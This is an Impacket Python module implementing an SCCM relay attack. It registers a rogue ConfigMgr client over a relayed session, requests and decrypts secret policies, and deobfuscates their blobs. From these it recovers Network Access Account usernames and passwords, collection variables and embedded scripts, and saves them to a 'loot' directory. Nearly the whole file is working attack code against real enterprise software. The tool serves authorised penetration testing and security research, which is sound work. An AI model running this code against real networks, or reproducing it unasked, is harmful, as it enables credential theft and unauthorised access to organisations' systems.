# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   SCCM relay attack to register a device and dump all secret policies
# 
# Authors:
#    Quentin Roland(@croco_byte) - Synacktiv
#    Based on SCCMSecrets.py (https://github.com/synacktiv/SCCMSecrets/)
#    Inspired by xpn's work (@xpn)

import os
import zlib
import json
import base64
import string
import random
import binascii
import xml.etree.ElementTree                            as ET

from time                                               import sleep
from datetime                                           import datetime, timedelta
from impacket                                           import LOG
from cryptography                                       import x509
from cryptography.x509.oid                              import NameOID
from cryptography.x509                                  import ObjectIdentifier
from cryptography.hazmat.primitives                     import serialization, hashes, padding
from cryptography.hazmat.primitives.asymmetric          import rsa
from cryptography.hazmat.primitives.asymmetric.padding  import PKCS1v15, OAEP, MGF1
from cryptography.hazmat.primitives.hashes              import SHA1
from cryptography.hazmat.primitives.ciphers             import Cipher, algorithms, modes
from cryptography.hazmat.backends                       import default_backend

from pyasn1_modules                                     import rfc5652
from pyasn1.codec.der.decoder                           import decode

# Request templates
REGISTRATION_REQUEST_TEMPLATE = """<Data HashAlgorithm="1.2.840.113549.1.1.11" SMSID="" RequestType="Registration" TimeStamp="{date}">
<AgentInformation AgentIdentity="CCMSetup.exe" AgentVersion="5.00.8325.0000" AgentType="0" />
<Certificates><Encryption Encoding="HexBinary" KeyType="1">{encryption}</Encryption><Signing Encoding="HexBinary" KeyType="1">{signature}</Signing></Certificates>
<DiscoveryProperties><Property Name="Netbios Name" Value="{client}" />
<Property Name="FQ Name" Value="{clientfqdn}" />
<Property Name="Locale ID" Value="2057" />
<Property Name="InternetFlag" Value="0" />
</DiscoveryProperties></Data>"""
REGISTRATION_REQUEST_WRAPPER_TEMPLATE = "<ClientRegistrationRequest>{data}<Signature><SignatureValue>{signature}</SignatureValue></Signature></ClientRegistrationRequest>\x00"

SCCM_HEADER_TEMPLATE = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{{5DD100CD-DF1D-45F5-BA17-A327F43465F8}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_ClientRegistration</TargetAddress><TargetEndpoint>MP_ClientRegistration</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
POLICY_REQUEST_HEADER_TEMPLATE = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook2 Name="clientauth"><Property Name="AuthSenderMachine">{client}</Property><Property Name="PublicKey">{publickey}</Property><Property Name="ClientIDSignature">{clientIDsignature}</Property><Property Name="PayloadSignature">{payloadsignature}</Property><Property Name="ClientCapabilities">NonSSL</Property><Property Name="HashAlgorithm">1.2.840.113549.1.1.11</Property></Hook2><Hook3 Name="zlib-compress" /></Hooks><ID>{{041A35B4-DCEE-4F64-A978-D4D489F47D28}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceID>GUID:{clientid}</SourceID><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_PolicyManager</TargetAddress><TargetEndpoint>MP_PolicyManager</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
POLICY_REQUEST_TEMPLATE = """<RequestAssignments SchemaVersion="1.00" ACK="false" RequestType="Always"><Identification><Machine><ClientID>GUID:{clientid}</ClientID><FQDN>{clientfqdn}</FQDN><NetBIOSName>{client}</NetBIOSName><SID /></Machine><User /></Identification><PolicySource>SMS:PRI</PolicySource><Resource ResourceType="Machine" /><ServerCookie /></RequestAssignments>"""
REPORT_BODY = """<Report><ReportHeader><Identification><Machine><ClientInstalled>0</ClientInstalled><ClientType>1</ClientType><ClientID>GUID:{clientid}</ClientID><ClientVersion>5.00.8325.0000</ClientVersion><NetBIOSName>{client}</NetBIOSName><CodePage>850</CodePage><SystemDefaultLCID>2057</SystemDefaultLCID><Priority /></Machine></Identification><ReportDetails><ReportContent>Inventory Data</ReportContent><ReportType>Full</ReportType><Date>{date}</Date><Version>1.0</Version><Format>1.1</Format></ReportDetails><InventoryAction ActionType="Predefined"><InventoryActionID>{{00000000-0000-0000-0000-000000000003}}</InventoryActionID><Description>Discovery</Description><InventoryActionLastUpdateTime>{date}</InventoryActionLastUpdateTime></InventoryAction></ReportHeader><REPORT_BODY /></Report>"""

OID_MAPPING = {
    '1.2.840.113549.3.7': "des-ede3-cbc",

    # PKCS1 v2.2
    '1.2.840.113549.1.1.1': 'rsaEncryption',
    '1.2.840.113549.1.1.2': 'md2WithRSAEncryption',
    '1.2.840.113549.1.1.3': 'md4withRSAEncryption',
    '1.2.840.113549.1.1.4': 'md5WithRSAEncryption',
    '1.2.840.113549.1.1.5': 'sha1-with-rsa-signature',
    '1.2.840.113549.1.1.6': 'rsaOAEPEncryptionSET',
    '1.2.840.113549.1.1.7': 'id-RSAES-OAEP',
    '1.2.840.113549.1.1.8': 'id-mgf1',
    '1.2.840.113549.1.1.9': 'id-pSpecified',
    '1.2.840.113549.1.1.10': 'rsassa-pss',

    # AES
    '2.16.840.1.101.3.4.1.41': 'aes256_ecb',
    '2.16.840.1.101.3.4.1.42': 'aes256_cbc',
    '2.16.840.1.101.3.4.1.43': 'aes256_ofb',
    '2.16.840.1.101.3.4.1.44': 'aes256_cfb',
    '2.16.840.1.101.3.4.1.45': 'aes256_wrap',
    '2.16.840.1.101.3.4.1.46': 'aes256_gcm',
    '2.16.840.1.101.3.4.1.47': 'aes256_ccm',
    '2.16.840.1.101.3.4.1.48': 'aes256_wrap_pad'
}




### Cryptography utility functions ###
def create_certificate(privatekey):
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, "ConfigMgr Client"),
    ])
    cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        issuer
    ).public_key(
        privatekey.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.utcnow() - timedelta(days=2)
    ).not_valid_after(
        datetime.utcnow() + timedelta(days=365)
    ).add_extension(
        x509.KeyUsage(digital_signature=True, key_encipherment=False, key_cert_sign=False,
                                key_agreement=False, content_commitment=False, data_encipherment=True,
                                crl_sign=False, encipher_only=False, decipher_only=False),
        critical=False,
    ).add_extension(
        x509.ExtendedKeyUsage([ObjectIdentifier("1.3.6.1.4.1.311.101.2"), ObjectIdentifier("1.3.6.1.4.1.311.101")]),
        critical=False,
    ).sign(privatekey, hashes.SHA256())

    return cert

def create_private_key():
    privatekey = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    return privatekey

def SCCM_sign(private_key, data):
        signature = private_key.sign(data, PKCS1v15(), hashes.SHA256())
        signature_rev = bytearray(signature)
        signature_rev.reverse()
        return bytes(signature_rev)


def build_MS_public_key_blob(private_key):
    blobHeader = b"\x06\x02\x00\x00\x00\xA4\x00\x00\x52\x53\x41\x31\x00\x08\x00\x00\x01\x00\x01\x00"
    blob = blobHeader + private_key.public_key().public_numbers().n.to_bytes(int(private_key.key_size / 8), byteorder="little")
    return blob.hex().upper()


### Various utility functions ###
def encode_UTF16_strip_BOM(data):
    return data.encode('utf-16')[2:]

def clean_junk_in_XML(xml_string):
    root_end = xml_string.rfind('</')
    if root_end != -1:
        root_end = xml_string.find('>', root_end) + 1
        clean_xml_string = xml_string[:root_end]
        return clean_xml_string
    return xml_string


### Client registration utility functions ###
def generate_registration_request_payload(management_point, public_key, private_key, client_name):
    registrationRequest = REGISTRATION_REQUEST_TEMPLATE.format(
        date=datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ"),
        encryption=public_key,
        signature=public_key,
        client=client_name.split('.')[0],
        clientfqdn=client_name
    )

    signature = SCCM_sign(private_key, encode_UTF16_strip_BOM(registrationRequest)).hex().upper()
    registrationRequestWrapper = REGISTRATION_REQUEST_WRAPPER_TEMPLATE.format(
     data=registrationRequest,
     signature=signature
    )
    registrationRequestWrapper = encode_UTF16_strip_BOM(registrationRequestWrapper) + "\r\n".encode('ascii')

    registrationRequestHeader = SCCM_HEADER_TEMPLATE.format(
        bodylength=len(registrationRequestWrapper)-2,
        client=client_name,
        date=datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ"),
        sccmserver=management_point
    )

    final_body = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii')
    final_body += registrationRequestHeader.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii')
    final_body += zlib.compress(registrationRequestWrapper) + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

    return final_body


### Policies request utility functions ###
def generate_policies_request_payload(management_point, private_key, client_guid, client_name):
    policyRequest = encode_UTF16_strip_BOM(POLICY_REQUEST_TEMPLATE.format(
        clientid=client_guid,
        clientfqdn=client_name,
        client=client_name.split('.')[0]
    )) + b"\x00\x00\r\n"
    policyRequestCompressed = zlib.compress(policyRequest)

    MSPublicKey = build_MS_public_key_blob(private_key)
    clientID = f"GUID:{client_guid.upper()}"
    clientIDSignature = SCCM_sign(private_key, encode_UTF16_strip_BOM(clientID) + "\x00\x00".encode('ascii')).hex().upper()
    policyRequestSignature = SCCM_sign(private_key, policyRequestCompressed).hex().upper()

    policyRequestHeader = POLICY_REQUEST_HEADER_TEMPLATE.format(
        bodylength=len(policyRequest)-2, 
        sccmserver=management_point, 
        client=client_name.split('.')[0],
        publickey=MSPublicKey, 
        clientIDsignature=clientIDSignature, 
        payloadsignature=policyRequestSignature, 
        clientid=client_guid, 
        date=datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ")
    )

    final_body = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii')
    final_body += policyRequestHeader.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii')
    final_body += policyRequestCompressed + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

    return final_body


### Secret policies utility functions ###
def decrypt_key_OEAP(encrypted_key, private_key):
    return private_key.decrypt(encrypted_key, OAEP(mgf=MGF1(algorithm=SHA1()), algorithm=SHA1(), label=None))

def decrypt_key_RSA(encrypted_key, private_key):
    return private_key.decrypt(encrypted_key, PKCS1v15())

def decrypt_body_triple_DES(body, plaintextkey, iv):
    cipher = Cipher(algorithms.TripleDES(plaintextkey), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(body) + decryptor.finalize()
    return plaintext.decode('utf-16le')

def decrypt_body_AESCBC(body, plaintextkey, iv):
    cipher = Cipher(algorithms.AES(plaintextkey), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(body) + decryptor.finalize()
    return plaintext.decode('utf-16le')

def decrypt_secret_policy(policy_response, private_key):
    content, _ = decode(policy_response, asn1Spec=rfc5652.ContentInfo())
    content, _ = decode(content.getComponentByName('content'), asn1Spec=rfc5652.EnvelopedData())
    encryptedRSAKey = content['recipientInfos'][0]['ktri']['encryptedKey'].asOctets()
    keyEncryptionOID = str(content['recipientInfos'][0]['ktri']['keyEncryptionAlgorithm']['algorithm'])
    iv = content['encryptedContentInfo']['contentEncryptionAlgorithm']['parameters'].asOctets()[2:]
    body = content['encryptedContentInfo']['encryptedContent'].asOctets()
    bodyEncryptionOID = str(content['encryptedContentInfo']['contentEncryptionAlgorithm']['algorithm'])

    try:
        if OID_MAPPING[keyEncryptionOID] == 'rsaEncryption':
            plaintextkey = decrypt_key_RSA(encryptedRSAKey, private_key)
        elif OID_MAPPING[keyEncryptionOID] == 'id-RSAES-OAEP':
            plaintextkey = decrypt_key_OEAP(encryptedRSAKey, private_key)
        else:
            LOG.error(f"Key decryption algorithm {OID_MAPPING[keyEncryptionOID]} is not currently implemented.")
            return
    except KeyError as e:
        LOG.error(f"[-] Unknown key decryption algorithm.")
        return

    try:
        if OID_MAPPING[bodyEncryptionOID] == 'des-ede3-cbc':
            plaintextbody = decrypt_body_triple_DES(body, plaintextkey, iv)
        elif OID_MAPPING[bodyEncryptionOID] == 'aes256_cbc':
            plaintextbody = decrypt_body_AESCBC(body, plaintextkey, iv)
        else:
            LOG.error(f"[-] Body decryption algorithm {OID_MAPPING[bodyEncryptionOID]} is not currently implemented.")
            return
    except KeyError as e:
        LOG.error(f"[-] Unknown body decryption algorithm.")
        return

    return plaintextbody

def mscrypt_derive_key_sha1(secret:bytes):
    # Implementation of CryptDeriveKey(prov, CALG_3DES, hash, 0, &cryptKey);
    buf1 = bytearray([0x36] * 64)
    buf2 = bytearray([0x5C] * 64)

    digest = hashes.Hash(hashes.SHA1(), backend=default_backend())
    digest.update(secret)
    hash_ = digest.finalize()

    for i in range(len(hash_)):
        buf1[i] ^= hash_[i]
        buf2[i] ^= hash_[i]

    digest1 = hashes.Hash(hashes.SHA1(), backend=default_backend())
    digest1.update(buf1)
    hash1 = digest1.finalize()

    digest2 = hashes.Hash(hashes.SHA1(), backend=default_backend())
    digest2.update(buf2)
    hash2 = digest2.finalize()

    derived_key = hash1 + hash2[:4]
    return derived_key

def deobfuscate_secret_policy_blob(output):
    if isinstance(output, str):
        output = bytes.fromhex(output)
    
    data_length = int.from_bytes(output[52:56], 'little')
    buffer = output[64:64+data_length]

    key = mscrypt_derive_key_sha1(output[4:4+0x28])
    iv = bytes([0] * 8)
    cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(buffer) + decryptor.finalize()

    padder = padding.PKCS7(64).unpadder() # 64 is the block size in bits for DES3
    decrypted_data = padder.update(decrypted_data) + padder.finalize()

    try:
        decrypted_data = decrypted_data.decode('utf-16-le')
    except:
        decrypted_data = decrypted_data.hex()
    return decrypted_data


def parse_policies_flags(policyFlagValue):
    policyFlagValue = int(policyFlagValue)
    NONE                        = 0b0000000
    TASKSEQUENCE                = 0b0000001
    REQUIRESAUTH                = 0b0000010
    SECRET                      = 0b0000100
    INTRANETONLY                = 0b0001000
    PERSISTWHOLEPOLICY          = 0b0010000
    AUTHORIZEDDYNAMICDOWNLOAD   = 0b0100000
    COMPRESSED                  = 0b1000000 

    result = []
    if policyFlagValue & TASKSEQUENCE != 0:
        result.append("TASKSEQUENCE")
    if policyFlagValue & REQUIRESAUTH != 0:
        result.append("REQUIRESAUTH")
    if policyFlagValue & SECRET != 0:
        result.append("SECRET")
    if policyFlagValue & INTRANETONLY != 0:
        result.append("INTRANETONLY")
    if policyFlagValue & PERSISTWHOLEPOLICY != 0:
        result.append("PERSISTWHOLEPOLICY")
    if policyFlagValue & AUTHORIZEDDYNAMICDOWNLOAD != 0:
        result.append("AUTHORIZEDDYNAMICDOWNLOAD")
    if policyFlagValue & COMPRESSED != 0:
        result.append("COMPRESSED")
    
    return result



class SCCMPoliciesAttack:
    
    def _run(self):
        LOG.info("Starting SCCM policies attack")

        management_point = f"{'https' if self.client.port == 443 else 'http'}://{self.client.host}"
        loot_dir = f"{self.client.host}_{datetime.now().strftime('%Y%m%d%H%M%S')}_sccm_policies_loot"
        if self.config.SCCMPoliciesClientname == None: self.config.SCCMPoliciesClientname = self.username.rstrip('$')
        if self.config.SCCMPoliciesSleep == None: self.config.SCCMPoliciesSleep = 180

        try:
            os.makedirs(loot_dir, exist_ok=True)
            LOG.info(f"Loot directory is: {loot_dir}")
        except Exception as err:
            LOG.error(f"Error creating base output directory: {err}")
            return

        os.makedirs(f"{loot_dir}/device")
        LOG.info(f"Generating Private key and client (self-signed) certificate")
        private_key = create_private_key()
        certificate = create_certificate(private_key)
        public_key = certificate.public_bytes(serialization.Encoding.DER).hex().upper()
        # Writing certs to device info directory for potential future use
        with open(f"{loot_dir}/device/cert.pem", 'wb') as f:
            f.write(certificate.public_bytes(serialization.Encoding.PEM))
        with open(f"{loot_dir}/device/key.pem", 'wb') as f:
            f.write(private_key.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm=serialization.NoEncryption()))

        # Device registration  
        LOG.info(f"Registering SCCM client with client name '{self.config.SCCMPoliciesClientname}'")
        registration_request_payload = generate_registration_request_payload(management_point, public_key, private_key, self.config.SCCMPoliciesClientname)
        
        try:
            register_response = self.register_client(management_point, registration_request_payload)
            if register_response == None:
                LOG.error(f"Device registration failed")
                return
            root = ET.fromstring(register_response[:-1])
            client_guid = root.attrib["SMSID"].split("GUID:")[1]
        except Exception as e:
            LOG.error(f"Device registration failed: {e}")
            return
    
        with open(f"{loot_dir}/device/guid.txt", 'w') as f:
            f.write(f"{client_guid}\n")
        with open(f"{loot_dir}/device/client_name.txt", 'w') as f:
            f.write(f"{self.config.SCCMPoliciesClientname}\n")

        LOG.info(f"Client registration complete - GUID: {client_guid}")
        LOG.info(f"Sleeping for {self.config.SCCMPoliciesSleep} seconds")
        sleep(int(self.config.SCCMPoliciesSleep))


        # Policies request
        policies_request_payload = generate_policies_request_payload(management_point, private_key, client_guid, self.config.SCCMPoliciesClientname)

        try:
            policies_response = self.request_policies(management_point, policies_request_payload)
            root = ET.fromstring(policies_response[:-1])
            policies = root.findall(".//Policy")
            policies_json = {}
            for policy in policies:
                policies_json[policy.attrib["PolicyID"]] = {"PolicyVersion": policy.attrib["PolicyVersion"] if "PolicyVersion" in policy.attrib else "N/A",
                                                "PolicyType": policy.attrib["PolicyType"] if "PolicyType" in policy.attrib else "N/A",
                                                "PolicyCategory": policy.attrib["PolicyCategory"] if "PolicyCategory" in policy.attrib else "N/A",
                                                "PolicyFlags": parse_policies_flags(policy.attrib["PolicyFlags"]) if "PolicyFlags" in policy.attrib else "N/A",
                                                "PolicyLocation": policy[0].text.replace("<mp>", management_point.split('http://')[1]) }
            with open(f'{loot_dir}/policies.json', 'w') as f:
                f.write(json.dumps(policies_json))
            with open(f'{loot_dir}/policies.raw', 'w') as f:
                f.write(policies_response)
            secret_policies = {}
            for key, value in policies_json.items():
                if isinstance(value["PolicyFlags"], list) and "SECRET" in value["PolicyFlags"]:
                    secret_policies[key] = value
        except Exception as e:
            LOG.error(f"Policies request failed: {e}")
            return

        LOG.info(f"Policies list retrieved. {len(policies_json.keys())} total policies; {len(secret_policies.keys())} secret policies")
        if len(secret_policies.keys()) <= 0:
            LOG.error(f"No secret policies retrieved. Either you relayed a user account and automatic device approval is not enabled, or something went wrong")
            return


        for key, value in secret_policies.items():
            try:
                result = self.secret_policy_process(key, value, private_key, client_guid, loot_dir)
                if result['NAA_credentials'] is not None:
                    LOG.info(f"Retrieved NAA account credentials: '{result['NAA_credentials']['NetworkAccessUsername']}:{result['NAA_credentials']['NetworkAccessPassword']}'")
            except Exception as e:
                LOG.info(f"Encountered an error when trying to process secret policy {key} - {e}")

        LOG.info(f"DONE - attack finished. Check loot directory {loot_dir}")
        LOG.info("You can reuse the registered device from the generated GUID/private key in the device/ subdirectory - for instance with SCCMSecrets.py. This is only possible for a limited time, before the legitimate device re-registers itself.")

        
    

    def register_client(self, management_point, registration_request_payload):
        headers = {
            "Connection": "close",
            "User-Agent": "ConfigMgr Messaging HTTP Sender",
            "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
        }
        
        self.client.request("CCM_POST", f"{management_point}/ccm_system_windowsauth/request", registration_request_payload, headers=headers)
        body = self.client.getresponse().read()


        boundary = "aAbBcCdDv1234567890VxXyYzZ"
        multipart_data = body.split(('--' + boundary).encode())
        for part in multipart_data:
            if not part or part == b'--\r\n':
                continue
            try:
                headers_part, content = part.split(b'\r\n\r\n', 1)
            except:
                pass

            if b'application/octet-stream' in headers_part:
                decompressed_content = zlib.decompress(content).decode('utf-16')
                return decompressed_content
        return None
    
    def request_policies(self, management_point, policies_request_payload):
        headers = {
            "Connection": "close",
            "User-Agent": "ConfigMgr Messaging HTTP Sender",
            "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
        }

        self.client.request("CCM_POST", f"{management_point}/ccm_system/request", policies_request_payload, headers=headers)
        body = self.client.getresponse().read()

        boundary = "aAbBcCdDv1234567890VxXyYzZ"
        multipart_data = body.split(('--' + boundary).encode())
        for part in multipart_data:
            if not part or part == b'--\r\n':
                continue
            try:
                headers_part, content = part.split(b'\r\n\r\n', 1)
            except:
                pass

            if b'application/octet-stream' in headers_part:
                decompressed_content = zlib.decompress(content).decode('utf-16')
                return decompressed_content
        return None
    
    def request_policy(self, policy_url, client_guid, private_key):
        headers = {
            "Connection": "close",
            "User-Agent": "ConfigMgr Messaging HTTP Sender"
        }

        headers["ClientToken"] = f"GUID:{client_guid};{datetime.now().strftime('%Y-%m-%dT%H:%M:%SZ')};2"
        headers["ClientTokenSignature"] = SCCM_sign(private_key, f"GUID:{client_guid};{datetime.now().strftime('%Y-%m-%dT%H:%M:%SZ')};2".encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()

        self.client.request("GET", policy_url, headers=headers)
        r = self.client.getresponse().read()
        return r


    def secret_policy_process(self, policyID, policy, private_key, client_guid, loot_dir):
        LOG.info(f"Processing secret policy {policyID}")
        os.makedirs(f'{loot_dir}/{policyID}')

        NAA_credentials = {"NetworkAccessUsername": None, "NetworkAccessPassword": None}
        policy_response = self.request_policy(policy["PolicyLocation"], client_guid, private_key)
        decrypted = decrypt_secret_policy(policy_response, private_key)[:-1]
        decrypted = clean_junk_in_XML(decrypted)
        
        if policy["PolicyCategory"] == "CollectionSettings":
            LOG.debug("Processing a CollectionSettings policy to extract collection variables")
            root = ET.fromstring(decrypted)
            binary_data = binascii.unhexlify(root.text)
            decompressed_data = zlib.decompress(binary_data)
            decrypted = decompressed_data.decode('utf16')

        with open(f'{loot_dir}/{policyID}/policy.txt', 'w') as f:
            f.write(decrypted)
        
        
        root = ET.fromstring(decrypted)

        blobs_set = {}

        if policy["PolicyCategory"] == "CollectionSettings":
            for instance in root.findall(".//instance"):
                name = None
                value = None
                for prop in instance.findall('property'):
                    prop_name = prop.get('name')
                    if prop_name == 'Name':
                        name = prop.find('value').text.strip()
                    elif prop_name == 'Value':
                        value = prop.find('value').text.strip()
                blobs_set[name] = value

        else:
            obfuscated_blobs = root.findall('.//*[@secret="1"]')    
            for obfuscated_blob in obfuscated_blobs:       
                blobs_set[obfuscated_blob.attrib["name"]] = obfuscated_blob[0].text
        
        LOG.debug(f"Found {len(blobs_set.keys())} obfuscated blob(s) in secret policy.")
        for i, blob_name in enumerate(blobs_set.keys()):
            data = deobfuscate_secret_policy_blob(blobs_set[blob_name])
            filename = f'{loot_dir}/{policyID}/secretBlob_{str(i+1)}-{blob_name}.txt'
            with open(filename, 'w') as f:
                f.write(f"Secret property name: {blob_name}\n\n")
                f.write(data + "\n")
            if blob_name == "NetworkAccessUsername":
                NAA_credentials["NetworkAccessUsername"] = data
            if blob_name == "NetworkAccessPassword":
                NAA_credentials["NetworkAccessPassword"] = data

            LOG.debug(f"Deobfuscated blob n°{i+1}")
            try:
                blobroot = ET.fromstring(clean_junk_in_XML(data))
                source_scripts = blobroot.findall('.//*[@property="SourceScript"]')
                if len(source_scripts) > 0:
                    LOG.debug(f"Found {len(source_scripts)} embedded powershell scripts in blob.")
                    for j, script in enumerate(source_scripts):
                        decoded_script = base64.b64decode(script.text).decode('utf-16le')
                        with open(f'{loot_dir}/{policyID}/secretBlob_{str(i+1)}-{blob_name}_embeddedScript_{j+1}.txt', 'w') as f:
                            f.write(decoded_script)
                            f.write("\n")

            except ET.ParseError as e:
                LOG.debug("Failed parsing XML on this blob - not XML content")
                pass
        
        if NAA_credentials["NetworkAccessUsername"] is not None:
            return {"NAA_credentials": NAA_credentials}
        else:
            return {"NAA_credentials": None}

